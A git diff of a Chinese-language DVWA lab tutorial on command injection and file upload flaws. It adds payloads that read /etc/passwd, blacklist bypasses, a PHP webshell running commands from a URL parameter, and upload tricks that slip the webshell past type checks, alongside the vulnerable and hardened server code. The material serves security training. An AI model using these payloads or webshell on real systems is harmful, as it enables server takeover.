@@ -60,16 +60,20 @@ DVWA 分為四種安全級別：Low，Medium，High，Impossible
 ```
 攻擊測試
 
-step 1: 輸入127.0.0.1 ==> 點擊提交
-step 2: 輸入127.0.0.1 ; cat /etc/passwd ==> 點擊提交
-step 3: 輸入127.0.0.1 ; cat /etc/passwd | tee /tmp/passwd ==> 點擊提交
+step 1: 輸入127.0.0.1 ==> 點擊submit
+step 2: 輸入127.0.0.1 ; cat /etc/passwd ==> 點擊submit
 
-==>成果畫面
+
+真正駭客會注入一隻one-line PHP webshell[請自行研讀!~請勿做壞事]
+
+輸入127.0.0.1 ; {one-line PHP webshell} ==> 點擊submit
+
+==>你的成果畫面
 
 ```
+>* [DVWA - Command Injection注入一隻網站木馬](https://www.youtube.com/watch?v=NxSNTT627TQ)
+
 關鍵程式碼解析
-
-
 ```
 <?php 
 
@@ -95,7 +99,7 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 ```
 >* PHP 預先定義的變數(Predefined Variables)$_REQUEST
 
->* [DVWA - Command Injection注入一隻網站木馬](https://www.youtube.com/watch?v=NxSNTT627TQ)
+
 
 ### Medium
 
@@ -107,13 +111,13 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
     // Get input 
     $target = $_REQUEST[ 'ip' ]; 
 
-    // Set blacklist 
+    // Set blacklist 設定黑名單
     $substitutions = array( 
         '&&' => '', 
         ';'  => '', 
     ); 
 
-    // Remove any of the charactars in the array (blacklist). 
+    // 使用黑名單(blacklist)過濾 Remove any of the charactars in the array (blacklist). 
     $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 
 
     // Determine OS and execute the ping command. 
@@ -133,10 +137,11 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 ?> 
 ```
 
-攻擊技法==>繞過黑名單(blacklist)過==>使用 | 
+攻擊技法==>繞過黑名單(blacklist)過濾==>使用 | 
 ```
-127.0.0.1| cat /etc/passwd
+127.0.0.1 | cat /etc/passwd
 ```
+
 ### High
 
 更完整的黑名單(blacklist)過濾
@@ -179,10 +184,10 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 
 ?> 
 ```
-攻擊1==>繞過黑名單(blacklist)過==>使用 | ==>殘念
-
+攻擊1==>繞過黑名單(blacklist)過==>把空白拿掉 ==>殘念
 ```
-127.0.0.1| cat /etc/passwd
+127.0.0.1|cat /etc/passwd
+127.0.0.1|cat%20/etc/passwd
 ```
 攻擊2==>繞過黑名單(blacklist)過==>使用 | ==>部分有用
 ```
@@ -943,12 +948,10 @@ $file = $_GET[ 'page' ];
 ?> 
 ```
 
-
-
-
 ### Medium
 ***
 如何避免File inclusion vulnerability??
+
 使用PHP str_replace() 函数過濾掉不該出現的咚咚
 
 伺服器程式分析
@@ -1029,12 +1032,222 @@ if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $f
 
 ### Low
 
+webshell程式碼::shell1.php
+```
+<form action="" method="get">
+Command: <input type="text" name="cmd" /><input type="submit" value="submit" />
+</form>
+Output:<br />
+<pre>
+<?php 
+if (isset($_GET['cmd']))    
+(    
+system($_GET['cmd'])
+) 
+?>
+</pre>
+```
+
+攻擊技術
+```
+先上傳正常圖片==>看看放在哪一個目錄
+http://192.168.1.250/DVWA/vulnerabilities/upload/
+
+
+再上傳一隻webshell(副檔名是php)
+http://192.168.1.250/DVWA/vulnerabilities/upload/../../hackable/uploads/shell1.php
+
+在瀏覽器直接執行遠端程式
+http://192.168.1.250/DVWA/hackable/uploads/shell1.php
+
+http://192.168.1.250/DVWA/hackable/uploads/shell1.php?cmd=ifconfig
+
+```
+
+關鍵程式碼解析
+```
+<?php 
+
+if( isset( $_POST[ 'Upload' ] ) ) { 
+    // Where are we going to be writing to? 
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
+    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 
+
+    // Can we move the file to the upload folder? 
+    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { 
+        // No 
+        echo '<pre>Your image was not uploaded.</pre>'; 
+    } 
+    else { 
+        // Yes! 
+        echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
+    } 
+} 
+
+?> 
+```
 ### Medium
+
+中階防禦工法==>檔案類型(jpg,png)檢查與大小限制
+```
+<?php 
+
+if( isset( $_POST[ 'Upload' ] ) ) { 
+    // Where are we going to be writing to? 
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
+    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 
+
+    // File information 
+    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
+    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; 
+    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
+
+    // Is it an image? 檔案類型(jpg,png)檢查與大小限制
+    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) && 
+        ( $uploaded_size < 100000 ) ) { 
+
+        // Can we move the file to the upload folder? 
+        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { 
+            // No 
+            echo '<pre>Your image was not uploaded.</pre>'; 
+        } 
+        else { 
+            // Yes! 
+            echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
+        } 
+    } 
+    else { 
+        // Invalid file 
+        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
+    } 
+} 
+
+?> 
+
+```
+再次攻擊
+```
+將webshell先修改副檔名:shell2.php==>shell2.jpg
+
+使用burpsuite攔截再改回名稱:
+filename=shell2.jpg==>filename=shell2.php
+
+```
+
 
 ### High
 
+高階防禦工法==>程式碼限制了副檔名的名稱(jpg,jpeg,png)
+
+```
+<?php 
+
+if( isset( $_POST[ 'Upload' ] ) ) { 
+    // Where are we going to be writing to? 
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
+    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 
+
+    // File information 
+    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
+    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 
+    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
+    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 
+
+    // Is it an image? 
+    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) && 
+        ( $uploaded_size < 100000 ) && 
+        getimagesize( $uploaded_tmp ) ) { 
+
+        // Can we move the file to the upload folder? 
+        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { 
+            // No 
+            echo '<pre>Your image was not uploaded.</pre>'; 
+        } 
+        else { 
+            // Yes! 
+            echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
+        } 
+    } 
+    else { 
+        // Invalid file 
+        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
+    } 
+} 
+
+?> 
+
+```
+
+```
+
+```
+
 ### Impossible
 
+```
+<?php 
+
+if( isset( $_POST[ 'Upload' ] ) ) { 
+    // Check Anti-CSRF token 
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
+
+
+    // File information 
+    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
+    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 
+    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
+    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; 
+    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 
+
+    // Where are we going to be writing to? 
+    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/'; 
+    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; 
+    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 
+    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) ); 
+    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 
+
+    // Is it an image? 
+    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) && 
+        ( $uploaded_size < 100000 ) && 
+        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) && 
+        getimagesize( $uploaded_tmp ) ) { 
+
+        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) 
+        if( $uploaded_type == 'image/jpeg' ) { 
+            $img = imagecreatefromjpeg( $uploaded_tmp ); 
+            imagejpeg( $img, $temp_file, 100); 
+        } 
+        else { 
+            $img = imagecreatefrompng( $uploaded_tmp ); 
+            imagepng( $img, $temp_file, 9); 
+        } 
+        imagedestroy( $img ); 
+
+        // Can we move the file to the web root from the temp folder? 
+        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { 
+            // Yes! 
+            echo "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>"; 
+        } 
+        else { 
+            // No 
+            echo '<pre>Your image was not uploaded.</pre>'; 
+        } 
+
+        // Delete any temp files 
+        if( file_exists( $temp_file ) ) 
+            unlink( $temp_file ); 
+    } 
+    else { 
+        // Invalid file 
+        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
+    } 
+} 
+
+// Generate Anti-CSRF token 
+generateSessionToken(); 
+
+?>
+```
 # XSS（Reflected）（反射型跨站腳本）
 
 ### Low
